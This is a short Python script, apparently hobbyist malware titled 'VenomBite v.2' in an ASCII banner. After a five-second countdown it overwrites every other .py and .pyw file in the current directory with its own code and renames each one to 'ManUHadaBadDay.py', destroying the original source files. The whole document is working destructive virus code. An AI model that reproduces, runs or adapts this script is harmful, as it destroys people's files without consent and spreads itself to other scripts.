import sys, glob, os, time

global e

with open(sys.argv[0], 'r') as e:
    lines = e.readlines()

Tobeinfected = glob.glob("*.py") + glob.glob("*.pyw")
replacement = []

for line in lines:
    replacement.append(line)

print("""
 __     __                                              _______   __    __                                      ______  
/  |   /  |                                            /       \ /  |  /  |                                    /      \ 
$$ |   $$ |  ______   _______    ______   _____  ____  $$$$$$$  |$$/  _$$ |_     ______         __     __     /$$$$$$  |
$$ |   $$ | /      \ /       \  /      \ /     \/    \ $$ |__$$ |/  |/ $$   |   /      \       /  \   /  |    $$____$$ |
$$  \ /$$/ /$$$$$$  |$$$$$$$  |/$$$$$$  |$$$$$$ $$$$  |$$    $$< $$ |$$$$$$/   /$$$$$$  |      $$  \ /$$/      /    $$/ 
 $$  /$$/  $$    $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$$$$$$  |$$ |  $$ | __ $$    $$ |       $$  /$$/      /$$$$$$/  
  $$ $$/   $$$$$$$$/ $$ |  $$ |$$ \__$$ |$$ | $$ | $$ |$$ |__$$ |$$ |  $$ |/  |$$$$$$$$/         $$ $$/    __ $$ |_____ 
   $$$/    $$       |$$ |  $$ |$$    $$/ $$ | $$ | $$ |$$    $$/ $$ |  $$  $$/ $$       |         $$$/    /  |$$       |
    $/      $$$$$$$/ $$/   $$/  $$$$$$/  $$/  $$/  $$/ $$$$$$$/  $$/    $$$$/   $$$$$$$/           $/     $$/ $$$$$$$$/ 
                
""")
print("You have 5 seconds to stop this\n")
time.sleep(5)
print("Its too late\n")
time.sleep(2)

for scripts in Tobeinfected:
    if scripts == sys.argv[0]:
        continue
    with open(scripts, 'r') as f:
        files = f.readlines()
        with open(scripts, 'w') as f:
            if lines == files:
                print("Cannot infect self")
                break
            else:
                f.writelines(replacement)
                print("Infected files " + scripts)
                os.rename(f.name, "ManUHadaBadDay.py")

input("\nPress enter to exit\n")